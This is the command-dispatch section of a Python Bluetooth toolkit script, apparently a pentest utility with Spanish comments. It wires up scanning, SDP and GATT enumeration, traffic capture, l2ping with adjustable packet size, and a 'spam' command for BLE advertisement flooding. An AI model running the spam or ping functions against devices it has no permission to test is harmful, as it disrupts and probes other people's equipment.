            _emit({"ok": ok, "iface": iface, "msg": msg})
        elif cmd == 'info':
            info = ctl_info(iface)
            if info is None:
                _emit({"ok": False, "error": "no se pudo obtener info del controller"})
                sys.exit(1)
            _emit({"ok": True, "controller": info})
        elif cmd == 'scan':
            # scan [iface] [seconds] [mode]
            args = sys.argv[2:]
            if args and re.match(r'^hci\d+$', args[0]):
                args = args[1:]
            seconds = int(args[0]) if args and args[0].isdigit() else 10
            mode = args[1] if len(args) > 1 else 'dual'
            devs, err = scan(iface, seconds, mode)
            if err:
                _emit({"ok": False, "error": err, "iface": iface})
                sys.exit(1)
            _emit({"ok": True, "iface": iface, "mode": mode,
                   "seconds": seconds, "count": len(devs or []),
                   "devices": devs or []})
        elif cmd == 'show':
            args = sys.argv[2:]
            if args and re.match(r'^hci\d+$', args[0]):
                args = args[1:]
            if not args:
                _emit({"ok": False, "error": "uso: bt_ops.py show [iface] <mac>"})
                sys.exit(1)
            mac = args[0].upper()
            data, err = show(mac, iface)
            if err:
                _emit({"ok": False, "error": err})
                sys.exit(1)
            _emit({"ok": True, "device": data})
        elif cmd == 'sdp':
            # bt_ops.py sdp <mac> [addr_type]
            args = sys.argv[2:]
            if args and re.match(r'^hci\d+$', args[0]):
                args = args[1:]
            if not args:
                _emit({"ok": False, "error": "uso: bt_ops.py sdp <mac> [addr_type]"})
                sys.exit(1)
            mac = args[0].upper()
            at = args[1] if len(args) > 1 else None
            data, err = sdp_browse(mac, addr_type=at)
            if err and not data:
                _emit({"ok": False, "error": err})
                sys.exit(1)
            _emit({"ok": True, "mac": mac,
                   "services": data.get("services", []),
                   "raw": data.get("raw", ""), "warn": err})
        elif cmd == 'gatt':
            # bt_ops.py gatt [iface] <mac>
            args = sys.argv[2:]
            if args and re.match(r'^hci\d+$', args[0]):
                args = args[1:]
            if not args:
                _emit({"ok": False, "error": "uso: bt_ops.py gatt [iface] <mac>"})
                sys.exit(1)
            data, err = gatt_enum(args[0].upper(), iface)
            if err and not data:
                _emit({"ok": False, "error": err})
                sys.exit(1)
            _emit({"ok": True, "mac": args[0].upper(),
                   "services": data.get("services", []),
                   "characteristics": data.get("characteristics", []),
                   "raw": data.get("raw", ""), "warn": err})
        elif cmd == 'spam':
            # bt_ops.py spam [iface] [seconds] [mode]
            args = sys.argv[2:]
            if args and re.match(r'^hci\d+$', args[0]):
                args = args[1:]
            secs = int(args[0]) if args and args[0].isdigit() else 20
            mode = args[1] if len(args) > 1 else "names"
            data, err = ble_spam(iface, secs, mode)
            if err and not data:
                _emit({"ok": False, "error": err})
                sys.exit(1)
            # `data` existe aun cuando el controller rechaza todo (cycles=0), por
            # eso el err va como "warn": asi el diagnostico HCI llega a la UI en
            # vez de perderse (si no, solo se veria "ciclos=0" sin causa).
            _emit({"ok": True, "warn": err, **(data or {})})
        elif cmd == 'capture':
            # bt_ops.py capture [iface] [seconds]
            args = sys.argv[2:]
            if args and re.match(r'^hci\d+$', args[0]):
                args = args[1:]
            secs = int(args[0]) if args and args[0].isdigit() else 30
            data, err = btmon_capture(iface, secs)
            if err and not (data and data.get("size", 0) > 0):
                _emit({"ok": False, "error": err, **(data or {})})
                sys.exit(1)
            _emit({"ok": True, "warn": err, **(data or {})})
        elif cmd == 'l2ping':
            # bt_ops.py l2ping <mac> [count] [size] [addr_type]
            args = sys.argv[2:]
            if args and re.match(r'^hci\d+$', args[0]):
                args = args[1:]
            if not args:
                _emit({"ok": False, "error": "uso: bt_ops.py l2ping <mac> [count] [size] [addr_type]"})
                sys.exit(1)
            mac = args[0].upper()
            count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 5
            size  = int(args[2]) if len(args) > 2 and args[2].isdigit() else 44
            at = args[3] if len(args) > 3 else None
            data, err = l2ping(mac, count, size, addr_type=at)
            if err and not (data and data.get("stats", {}).get("received", 0) > 0):
                _emit({"ok": False, "error": err, "stats": (data or {}).get("stats")})
                sys.exit(1)
            _emit({"ok": True, "mac": mac,
                   "stats": data.get("stats"), "raw": data.get("raw", ""),
                   "warn": err})
        else:
            _emit({"ok": False, "error": f"comando desconocido: {cmd}"})
            sys.exit(1)
    except Exception as e:
        _emit({"ok": False, "error": f"excepcion: {e}"})
        sys.exit(1)


if __name__ == "__main__":
    # Envoltorio con log centralizado (ActionLog): captura stdout + exit code.
    try:
        _here = os.path.dirname(os.path.abspath(__file__))
        _app  = os.path.abspath(os.path.join(_here, ".."))
        if _app not in sys.path:
            sys.path.insert(0, _app)
        from db.action_log import run_cli_with_log
        run_cli_with_log("bluetooth", main)
    except Exception:
        # Si el logging no esta disponible, no interrumpimos el funcionamiento.
        main()
